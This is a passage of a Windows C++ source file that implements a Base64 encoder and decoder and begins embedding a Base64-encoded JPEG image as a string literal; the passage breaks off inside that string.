#include <string>
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <windows.h>
#include <ctime>
#include <cstdint>
#include <dos.h>
#include <string.h>
#include <tchar.h>

//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

#ifndef __BASE64_H_01__
#define __BASE64_H_01__

class Base64{
	
private:
	
	uint32_t BASE64_Encode[64 ];
	uint32_t BASE64_Decode[256];
	
public:
	
	Base64();
	uint32_t encode(char*, void*, uint32_t)const;
	uint32_t decode(void*, char*, uint32_t)const;
	
};

Base64 base64;

#endif//__BASE64_H_01__

//using namespace std;

Base64::Base64(){
	uint32_t ind=0;
	for(uint32_t i=0; i<26; i++)BASE64_Encode[ind++]='A'+i;
	for(uint32_t i=0; i<26; i++)BASE64_Encode[ind++]='a'+i;
	for(uint32_t i=0; i<10; i++)BASE64_Encode[ind++]='0'+i;
	BASE64_Encode[ind++]='+';
	BASE64_Encode[ind++]='/';
	for(uint32_t i=0; i<64; i++)BASE64_Decode[BASE64_Encode[i]]=i;
}

uint32_t Base64::encode(char *dst, void *psrc, uint32_t len)const{
	uint8_t *src=static_cast<uint8_t*>(psrc);
	uint32_t dpos=0, spos=0;
	while(len>=3){
		dst[dpos++]=BASE64_Encode[((src[spos  ]&0xFC)>>2)];
		dst[dpos++]=BASE64_Encode[((src[spos  ]&0x03)<<4)|((src[spos+1]&0xF0)>>4)];
		dst[dpos++]=BASE64_Encode[((src[spos+1]&0x0F)<<2)|((src[spos+2]&0xC0)>>6)];
		dst[dpos++]=BASE64_Encode[((src[spos+2]&0x3F)   )];
		spos+=3;
		len-=3;
	}
	if(len==2){
		dst[dpos++]=BASE64_Encode[((src[spos  ]&0xFC)>>2)];
		dst[dpos++]=BASE64_Encode[((src[spos  ]&0x03)<<4)|((src[spos+1]&0xF0)>>4)];
		dst[dpos++]=BASE64_Encode[((src[spos+1]&0x0F)<<2)|((0x00       &0xC0)>>6)];
		dst[dpos++]='=';
	}
	else if(len==1){
		dst[dpos++]=BASE64_Encode[((src[spos  ]&0xFC)>>2)];
		dst[dpos++]=BASE64_Encode[((src[spos  ]&0x03)<<4)|((0x00       &0xF0)>>4)];
		dst[dpos++]='=';
		dst[dpos++]='=';
	}
	dst[dpos]='\0';
	return dpos;
}

uint32_t Base64::decode(void *pdst, char *src, uint32_t len)const{
	uint8_t *dst=static_cast<uint8_t*>(pdst);
	uint32_t dpos=0, spos=0;
	len&=0xFFFFFFFC;
	while(len!=0){
		dst[dpos++]=     ((BASE64_Decode[src[spos  ]]&0x3F)<<2)|((BASE64_Decode[src[spos+1]]&0x30)>>4);
		if(src[spos+2]=='=')dst[dpos++]='\0';
		else dst[dpos++]=((BASE64_Decode[src[spos+1]]&0x0F)<<4)|((BASE64_Decode[src[spos+2]]&0x3C)>>2);
		if(src[spos+3]=='=')dst[dpos++]='\0';
		else dst[dpos++]=((BASE64_Decode[src[spos+2]]&0x03)<<6)|((BASE64_Decode[src[spos+3]]&0x3F)   );
		len-=4;
		spos+=4;
	}
	return dpos;
}

char jpg_b64[]="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